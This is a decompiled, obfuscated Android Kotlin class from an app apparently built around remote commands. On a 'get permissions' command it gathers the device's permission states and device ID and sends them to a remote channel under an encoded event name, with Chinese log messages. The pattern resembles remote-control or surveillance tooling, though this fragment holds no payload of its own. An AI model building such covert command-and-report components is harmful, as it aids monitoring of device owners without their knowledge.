package com.storm.safe.rock.service.modules.command;

import com.storm.safe.rock.service.modules.C0323a8;
import com.storm.safe.rock.util.StringUtil;
import java.util.Map;
import kotlin.coroutines.intrinsics.CoroutineSingletons;
import kotlin.coroutines.jvm.internal.SuspendLambda;
import org.json.JSONObject;
import p000.C1351vv;
import p000.InterfaceC0876mv;
import p000.InterfaceC0920no;
import p000.InterfaceC1116qn;
import p000.an0;
import p000.kg1;
import p000.l10;
import p000.t60;
import p000.uz0;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
@InterfaceC1116qn(m214402c = "com.storm.safe.rock.service.modules.command.AppCommandHandler$handleGetPermissions$2", m214403f = "AppCommandHandler.kt", m214404l = {}, m214405m = "invokeSuspend")
/* loaded from: classes2.dex */
final class AppCommandHandler$handleGetPermissions$2 extends SuspendLambda implements l10 {

    /* renamed from: a1 */
    public final /* synthetic */ uz0 f53426a1;

    /* renamed from: a2 */
    public final /* synthetic */ C0323a8 f53427a2;

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public AppCommandHandler$handleGetPermissions$2(uz0 uz0Var, C0323a8 c0323a8, InterfaceC0876mv interfaceC0876mv) {
        super(2, interfaceC0876mv);
        this.f53426a1 = uz0Var;
        this.f53427a2 = c0323a8;
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final InterfaceC0876mv create(Object obj, InterfaceC0876mv interfaceC0876mv) {
        return new AppCommandHandler$handleGetPermissions$2(this.f53426a1, this.f53427a2, interfaceC0876mv);
    }

    @Override // p000.l10
    public final Object invoke(Object obj, Object obj2) {
        return ((AppCommandHandler$handleGetPermissions$2) create((InterfaceC0920no) obj, (InterfaceC0876mv) obj2)).invokeSuspend(C1351vv.f60710b1);
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final Object invokeSuspend(Object obj) throws Throwable {
        uz0 uz0Var = this.f53426a1;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        kg1.m213544f4(obj);
        try {
            String str = an0.f43729a0;
            Map mapM209824a0 = an0.m209824a0(uz0Var.f60536a0);
            C0323a8 c0323a8 = this.f53427a2;
            if (c0323a8 != null) {
                String strM212470a0 = StringUtil.m212470a0("O1wDN0QrHydYPzhmAz9eKAMgRDQ=");
                JSONObject jSONObject = new JSONObject();
                jSONObject.put("deviceId", uz0Var.f60536a0.m211470g4());
                jSONObject.put("permissions", new JSONObject((Map<?, ?>) mapM209824a0));
                c0323a8.m211658c4(strM212470a0, jSONObject);
            }
            t60.m214714d6("AppCmdHandler", "权限状态已发送: " + mapM209824a0);
        } catch (Exception e) {
            t60.m214705c6("AppCmdHandler", "获取权限状态失败", e);
        }
        return new Integer(0);
    }
}
